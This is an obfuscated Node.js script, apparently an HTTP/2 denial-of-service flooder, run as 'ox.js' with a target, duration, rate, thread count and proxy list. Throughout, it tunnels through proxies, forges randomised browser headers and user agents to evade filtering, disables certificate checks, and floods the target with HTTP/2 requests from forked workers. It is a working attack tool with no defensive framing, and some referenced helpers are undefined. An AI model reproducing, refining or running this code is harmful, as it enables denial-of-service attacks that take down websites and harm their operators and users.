const _0xd36294=_0x5967;(function(_0x2a9f03,_0x2d2157){const _0x5cd69d=_0x5967,_0x439bed=_0x2a9f03();while(!![]){try{const _0x533d8c=parseInt(_0x5cd69d(0x16f))/0x1*(parseInt(_0x5cd69d(0x199))/0x2)+-parseInt(_0x5cd69d(0x1b6))/0x3+parseInt(_0x5cd69d(0x171))/0x4*(parseInt(_0x5cd69d(0x1a0))/0x5)+-parseInt(_0x5cd69d(0x17c))/0x6+-parseInt(_0x5cd69d(0x1be))/0x7*(-parseInt(_0x5cd69d(0x173))/0x8)+-parseInt(_0x5cd69d(0x155))/0x9*(parseInt(_0x5cd69d(0x1ac))/0xa)+-parseInt(_0x5cd69d(0x174))/0xb*(-parseInt(_0x5cd69d(0x192))/0xc);if(_0x533d8c===_0x2d2157)break;else _0x439bed['push'](_0x439bed['shift']());}catch(_0x1a52b0){_0x439bed['push'](_0x439bed['shift']());}}}(_0x5717,0xc17b6));const net=require(_0xd36294(0x170)),http2=require(_0xd36294(0x1a5)),tls=require('tls'),cluster=require(_0xd36294(0x1a8)),url=require(_0xd36294(0x1a7)),crypto=require(_0xd36294(0x183)),fs=require('fs');lang_header=['pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',_0xd36294(0x150),_0xd36294(0x19b),'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7',_0xd36294(0x14d),'zh-TW,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6','nl-NL,nl;q=0.9,en-US;q=0.8,en;q=0.7',_0xd36294(0x148),_0xd36294(0x1a4),_0xd36294(0x166),_0xd36294(0x1b8),'en-US,en;q=0.5','en-US,en;q=0.9',_0xd36294(0x19c),_0xd36294(0x19f),_0xd36294(0x1b3)],encoding_header=[_0xd36294(0x161),_0xd36294(0x17f),_0xd36294(0x179),_0xd36294(0x17b),'*'],process[_0xd36294(0x181)](0x0),require(_0xd36294(0x193))[_0xd36294(0x168)][_0xd36294(0x16c)]=0x0,process['on'](_0xd36294(0x18c),function(_0x3e93a5){});process[_0xd36294(0x197)][_0xd36294(0x172)]<0x7&&(console[_0xd36294(0x178)]('node\x20ox.js\x20target\x20time\x20rate\x20thread\x20proxy.txt'),process[_0xd36294(0x14a)]());const headers={};function readLines(_0x390ba2){const _0x440066=_0xd36294;return fs[_0x440066(0x142)](_0x390ba2,'utf-8')[_0x440066(0x175)]()[_0x440066(0x152)](/\r?\n/);}function randomIntn(_0x4c0d24,_0x2e8216){const _0x2fc347=_0xd36294;return Math[_0x2fc347(0x158)](Math[_0x2fc347(0x1aa)]()*(_0x2e8216-_0x4c0d24)+_0x4c0d24);}function randomElement(_0x593578){const _0x499344=_0xd36294;return _0x593578[randomIntn(0x0,_0x593578[_0x499344(0x172)])];}const args={'target':process[_0xd36294(0x197)][0x2],'time':~~process[_0xd36294(0x197)][0x3],'Rate':~~process[_0xd36294(0x197)][0x4],'threads':~~process[_0xd36294(0x197)][0x5],'proxyFile':process[_0xd36294(0x197)][0x6]};var proxies=readLines(args[_0xd36294(0x15d)]);const parsedTarget=url['parse'](args[_0xd36294(0x1bd)]);if(cluster[_0xd36294(0x1b0)]){for(let counter=0x1;counter<=args[_0xd36294(0x14c)];counter++){cluster[_0xd36294(0x1b2)]();}console[_0xd36294(0x15c)](),console[_0xd36294(0x178)]('\x1b[1m\x1b[34m'+_0xd36294(0x184)+_0xd36294(0x154)+_0xd36294(0x1af)+parsedTarget[_0xd36294(0x1ab)]+_0xd36294(0x154)),console[_0xd36294(0x178)](_0xd36294(0x147)+_0xd36294(0x18d)+'\x1b[0m'+_0xd36294(0x1af)+args[_0xd36294(0x194)]+'\x1b[0m'),console[_0xd36294(0x178)](_0xd36294(0x140)+_0xd36294(0x157)+_0xd36294(0x154)+'\x1b[1m'+args[_0xd36294(0x14c)]+_0xd36294(0x154)),console[_0xd36294(0x178)](_0xd36294(0x1ba)+_0xd36294(0x1b9)+_0xd36294(0x154)+_0xd36294(0x1af)+args['Rate']+_0xd36294(0x154)),setTimeout(()=>{const _0x199165=_0xd36294;process[_0x199165(0x14a)](0x1);},process[_0xd36294(0x197)][0x3]*0x3e8);}if(cluster['isMaster'])for(let counter=0x1;counter<=args[_0xd36294(0x14c)];counter++){cluster[_0xd36294(0x1b2)]();}else setInterval(runFlooder);setTimeout(function(){const _0x59ba89=_0xd36294;process[_0x59ba89(0x14a)](0x1);},process[_0xd36294(0x197)][0x3]*0x3e8),process['on'](_0xd36294(0x18c),function(_0x4d4b14){}),process['on']('unhandledRejection',function(_0x26473f){});class NetSocket{constructor(){}[_0xd36294(0x1b4)](_0x35023b,_0x333e2d){const _0x45ed2d=_0xd36294,_0x4609ae=_0x35023b[_0x45ed2d(0x1bc)][_0x45ed2d(0x152)](':'),_0x408df9=_0x4609ae[0x0],_0x3243d8=_0x45ed2d(0x1a2)+_0x35023b['address']+_0x45ed2d(0x188)+_0x35023b[_0x45ed2d(0x1bc)]+_0x45ed2d(0x17e),_0x59b7ca=new Buffer[(_0x45ed2d(0x195))](_0x3243d8),_0x6b0568=net[_0x45ed2d(0x196)]({'host':_0x35023b['host'],'port':_0x35023b[_0x45ed2d(0x198)],'allowHalfOpen':!![],'writable':!![],'readable':!![]});_0x6b0568[_0x45ed2d(0x160)](_0x35023b[_0x45ed2d(0x144)]*0xa*0x2710),_0x6b0568['on'](_0x45ed2d(0x196),()=>{_0x6b0568['write'](_0x59b7ca);}),_0x6b0568['on'](_0x45ed2d(0x18f),_0x3d457d=>{const _0x132568=_0x45ed2d,_0x3f108b=_0x3d457d['toString'](_0x132568(0x16e)),_0x5bfa31=_0x3f108b[_0x132568(0x1a6)](_0x132568(0x169));if(_0x5bfa31===![])return _0x6b0568[_0x132568(0x189)](),_0x333e2d(undefined,_0x132568(0x162));return _0x333e2d(_0x6b0568,undefined);}),_0x6b0568['on'](_0x45ed2d(0x144),()=>{const _0x4d20bb=_0x45ed2d;return _0x6b0568[_0x4d20bb(0x189)](),_0x333e2d(undefined,_0x4d20bb(0x185));});}}function getRandomUserAgent(){const _0x1b9af8=_0xd36294,_0x2f35ea=['Windows\x20NT\x2010.0',_0x1b9af8(0x18b),_0x1b9af8(0x1b5),'Macintosh',_0x1b9af8(0x143),'Linux'],_0x174011=[_0x1b9af8(0x1bf),_0x1b9af8(0x149),_0x1b9af8(0x190),'Edge',_0x1b9af8(0x167)],_0x234ebe=['en-US',_0x1b9af8(0x163),_0x1b9af8(0x1bb),'de-DE',_0x1b9af8(0x14e)],_0x3521e8=['US','GB','FR','DE','ES'],_0x43b62b=[_0x1b9af8(0x186),'Google',_0x1b9af8(0x159),_0x1b9af8(0x165),_0x1b9af8(0x14f)],_0x310d7f=_0x2f35ea[Math[_0x1b9af8(0x158)](Math[_0x1b9af8(0x1aa)]()*_0x2f35ea[_0x1b9af8(0x172)])],_0x46b2e0=_0x174011[Math[_0x1b9af8(0x158)](Math[_0x1b9af8(0x1aa)]()*_0x174011[_0x1b9af8(0x172)])],_0x37ad05=_0x234ebe[Math[_0x1b9af8(0x158)](Math[_0x1b9af8(0x1aa)]()*_0x234ebe[_0x1b9af8(0x172)])],_0x28e3fd=_0x3521e8[Math[_0x1b9af8(0x158)](Math[_0x1b9af8(0x1aa)]()*_0x3521e8[_0x1b9af8(0x172)])],_0x4b5060=_0x43b62b[Math[_0x1b9af8(0x158)](Math['random']()*_0x43b62b[_0x1b9af8(0x172)])],_0x38240d=Math[_0x1b9af8(0x158)](Math[_0x1b9af8(0x1aa)]()*0x64)+0x1,_0x301e02=Math[_0x1b9af8(0x158)](Math[_0x1b9af8(0x1aa)]()*0x6)+0x1,_0x27e218=_0x4b5060+'/'+_0x46b2e0+'\x20'+_0x38240d+'.'+_0x38240d+'.'+_0x38240d+'\x20('+_0x310d7f+';\x20'+_0x28e3fd+';\x20'+_0x37ad05+')',_0x429e02=btoa(_0x27e218);let _0x2362a2='';for(let _0x57049b=0x0;_0x57049b<_0x429e02[_0x1b9af8(0x172)];_0x57049b++){_0x57049b%_0x301e02===0x0?_0x2362a2+=_0x429e02['charAt'](_0x57049b):_0x2362a2+=_0x429e02[_0x1b9af8(0x153)](_0x57049b)[_0x1b9af8(0x16b)]();}return _0x2362a2;}function _0x5967(_0xe14fd8,_0x3bbafe){const _0x5717de=_0x5717();return _0x5967=function(_0x59675f,_0x7750e0){_0x59675f=_0x59675f-0x13e;let _0x18b273=_0x5717de[_0x59675f];return _0x18b273;},_0x5967(_0xe14fd8,_0x3bbafe);}const Header=new NetSocket();headers[':method']=_0xd36294(0x1a1),headers[_0xd36294(0x187)]=parsedTarget['path'],headers[_0xd36294(0x151)]=_0xd36294(0x19e),headers[':authority']=randomString(0xa)+'.'+parsedTarget[_0xd36294(0x1ab)],headers[_0xd36294(0x15e)]=randomHeaders[_0xd36294(0x15e)],headers[_0xd36294(0x16d)]=_0xd36294(0x161),headers['accept-language']=headerFunc[_0xd36294(0x1b1)](),headers['accept-encoding']=headerFunc[_0xd36294(0x156)](),headers['Connection']=Math['random']()>0.5?_0xd36294(0x14b):_0xd36294(0x145),headers['upgrade-insecure-requests']=Math[_0xd36294(0x1aa)]()>0.5,headers[_0xd36294(0x15b)]=_0xd36294(0x1b7),headers['pragma']=Math[_0xd36294(0x1aa)]()>0.5?_0xd36294(0x18e):_0xd36294(0x1a3),headers[_0xd36294(0x15a)]=Math[_0xd36294(0x1aa)]()>0.5?_0xd36294(0x18e):_0xd36294(0x1a3);function runFlooder(){const _0x49866e=_0xd36294,_0x7c3b39=randomElement(proxies),_0x1d710c=_0x7c3b39['split'](':');headers[':authority']=parsedTarget[_0x49866e(0x1ab)],headers[_0x49866e(0x182)]=getRandomUserAgent();const _0x252441={'host':_0x1d710c[0x0],'port':~~_0x1d710c[0x1],'address':parsedTarget[_0x49866e(0x1ab)]+_0x49866e(0x17a),'timeout':0x64};Header[_0x49866e(0x1b4)](_0x252441,(_0x4fd92c,_0x29a76a)=>{const _0x53bfdd=_0x49866e;if(_0x29a76a)return;_0x4fd92c[_0x53bfdd(0x17d)](!![],0xea60);const _0x2a3ace={'ALPNProtocols':['h2',_0x53bfdd(0x164)],'echdCurve':_0x53bfdd(0x19a),'ciphers':_0x53bfdd(0x13f),'rejectUnauthorized':![],'socket':_0x4fd92c,'honorCipherOrder':!![],'secure':!![],'port':0x1bb,'uri':parsedTarget[_0x53bfdd(0x1ab)],'servername':parsedTarget[_0x53bfdd(0x1ab)],'secureProtocol':[_0x53bfdd(0x176),'TLSv1_2_method',_0x53bfdd(0x15f)],'secureOptions':crypto[_0x53bfdd(0x18a)][_0x53bfdd(0x141)]|crypto['constants']['SSL_OP_NO_TICKET']|crypto[_0x53bfdd(0x18a)][_0x53bfdd(0x13e)]|crypto['constants']['SSL_OP_CIPHER_SERVER_PREFERENCE']|crypto[_0x53bfdd(0x18a)][_0x53bfdd(0x180)]|crypto['constants']['SSL_OP_NO_SSLv3']|crypto[_0x53bfdd(0x18a)][_0x53bfdd(0x19d)]|crypto[_0x53bfdd(0x18a)][_0x53bfdd(0x1ae)]},_0x55e9d6=tls[_0x53bfdd(0x196)](0x1bb,parsedTarget[_0x53bfdd(0x1ab)],_0x2a3ace);_0x55e9d6[_0x53bfdd(0x17d)](!![],0x3c*0x2710);const _0x26f4e5=http2[_0x53bfdd(0x196)](parsedTarget['href'],{'protocol':_0x53bfdd(0x146),'settings':{'headerTableSize':0x10000,'maxConcurrentStreams':0x4e20,'initialWindowSize':0x600000*0xa,'maxHeaderListSize':0x40000*0xa,'enablePush':![]},'maxSessionMemory':0xfa00,'maxDeflateDynamicTableSize':0xffffffff,'createConnection':()=>_0x55e9d6,'socket':_0x4fd92c});_0x26f4e5['settings']({'headerTableSize':0x10000,'maxConcurrentStreams':0x3e8,'initialWindowSize':0x600000,'maxHeaderListSize':0x40000,'enablePush':![]}),_0x26f4e5['on'](_0x53bfdd(0x196),()=>{const _0x434a70=setInterval(()=>{const _0x194969=_0x5967;for(let _0x52f692=0x0;_0x52f692<args[_0x194969(0x16a)];_0x52f692++){const _0x26f233=_0x26f4e5[_0x194969(0x1a9)](headers)['on'](_0x194969(0x1ad),_0x281832=>{const _0xd37c54=_0x194969;_0x26f233[_0xd37c54(0x145)](),_0x26f233['destroy']();return;});_0x26f233[_0x194969(0x191)]();}},0x3e8);}),_0x26f4e5['on'](_0x53bfdd(0x145),()=>{const _0x3043fa=_0x53bfdd;_0x26f4e5[_0x3043fa(0x189)](),_0x4fd92c[_0x3043fa(0x189)]();return;}),_0x26f4e5['on'](_0x53bfdd(0x177),_0x36be61=>{const _0x8874f7=_0x53bfdd;_0x26f4e5['destroy'](),_0x4fd92c[_0x8874f7(0x189)]();return;});});}const KillScript=()=>process[_0xd36294(0x14a)](0x1);setTimeout(KillScript,args[_0xd36294(0x194)]*0x3e8);function _0x5717(){const _0x3b3e73=['\x1b[0m','801DSySAm','encoding','Threads:\x20','floor','Microsoft','cache-control','x-requested-with','clear','proxyFile','accept','TLSv1_3_method','setTimeout','gzip,\x20deflate,\x20br','error:\x20invalid\x20response\x20from\x20proxy\x20server','en-GB','http/1.1','Mozilla','he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7','Opera','EventEmitter','HTTP/1.1\x20200','Rate','toUpperCase','defaultMaxListeners','Accept-Encoding','utf-8','417FbZDgn','net','18964XjaAyo','length','10179208dTBOuo','11165cNBAKd','toString','TLSv1_1_method','error','log','deflate,\x20gzip',':443','gzip,\x20identity','3186096efiGLM','setKeepAlive',':443\x0d\x0aConnection:\x20Keep-Alive\x0d\x0a\x0d\x0a','compress,\x20gzip','SSL_OP_NO_SSLv2','setMaxListeners','user-agent','crypto','Target:\x20','error:\x20timeout\x20exceeded','Apple',':path',':443\x20HTTP/1.1\x0d\x0aHost:\x20','destroy','constants','Windows\x20NT\x206.1','uncaughtException','Duration:\x20','no-cache','data','Safari','end','7572EEeRxO','events','time','from','connect','argv','port','6508yAauxf','GREASE:X25519:x25519','ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7','de-CH;q=0.7','SSL_OP_NO_TLSv1','https','da,\x20en-gb;q=0.8,\x20en;q=0.7','35UYkyiq','GET','CONNECT\x20','max-age=0','sv-SE,sv;q=0.9,en-US;q=0.8,en;q=0.7','http2','includes','url','cluster','request','random','host','118940RrwPkV','response','SSL_OP_NO_TLSv1_1','\x1b[1m','isMaster','lang','fork','tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7','HTTP','Windows\x20NT\x206.3','2762661dYICsy','XMLHttpRequest','fr-CH,\x20fr;q=0.9,\x20en;q=0.8,\x20de;q=0.7,\x20*;q=0.5','Requests\x20per\x20second:\x20','\x1b[1m\x1b[31m','fr-FR','address','target','7bFKOwD','Chrome','SSL_OP_NO_COMPRESSION','TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA','\x1b[1m\x1b[32m','SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION','readFileSync','Android','timeout','close','https:','\x1b[1m\x1b[33m','fi-FI,fi;q=0.9,en-US;q=0.8,en;q=0.7','Firefox','exit','keep-alive','threads','ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7','es-ES','Opera\x20Software','es-ES,es;q=0.9,gl;q=0.8,ca;q=0.7',':scheme','split','charAt'];_0x5717=function(){return _0x3b3e73;};return _0x5717();}